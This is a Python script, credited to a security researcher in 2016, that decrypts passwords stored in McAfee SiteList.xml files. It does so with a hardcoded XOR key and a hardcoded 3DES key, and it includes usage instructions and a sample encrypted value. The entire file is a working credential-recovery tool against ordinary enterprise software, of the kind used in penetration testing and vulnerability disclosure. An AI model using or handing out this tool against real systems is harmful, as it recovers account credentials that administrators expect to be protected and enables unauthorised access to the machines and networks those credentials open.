#!/usr/bin/env python
# Info: 
#    McAfee Sitelist.xml password decryption tool
#    Jerome Nokin (@funoverip) - Feb 2016
#    More info on https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/
#
# Quick howto: 
#    Search for the XML element <Password Encrypted="1">...</Password>,
#    and paste the content as argument.
#
###########################################################################

import sys
import base64
from Crypto.Cipher import DES3
from Crypto.Hash import SHA


# hardcoded XOR key
KEY = bytearray.fromhex("12150F10111C1A060A1F1B1817160519").decode("utf-8")

def sitelist_xor(xs):
    result = bytearray(0)
    for i, c in enumerate(xs):
        cb = c.to_bytes(1, byteorder="big")
        result += (ord(cb) ^ ord(KEY[i%16])).to_bytes(1, byteorder="big")
    return result

def des3_ecb_decrypt(data):
    # hardcoded 3DES key
    key = SHA.new(b'<!@#$%^>').digest() + bytearray(4)
    # decrypt
    des3 = DES3.new(key, DES3.MODE_ECB)
    data += bytearray(64 - (len(data) % 64))
    decrypted = des3.decrypt(data)
    return decrypted[0:decrypted.find(0)] or "<empty>"

if __name__ == "__main__":

    if len(sys.argv) != 2:
        print("Usage:   %s <base64 passwd>" % sys.argv[0])
        print("Example: %s 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='" % sys.argv[0])
        sys.exit(0)

    # read arg
    encrypted_password = base64.b64decode(bytes(sys.argv[1], "utf-8"))
    # decrypt
    passwdXOR = sitelist_xor(encrypted_password)
    password = des3_ecb_decrypt(passwdXOR).decode("utf-8")
    # print out
    print("Crypted password   : %s" % sys.argv[1])
    print("Decrypted password : %s" % password)

    sys.exit(0)
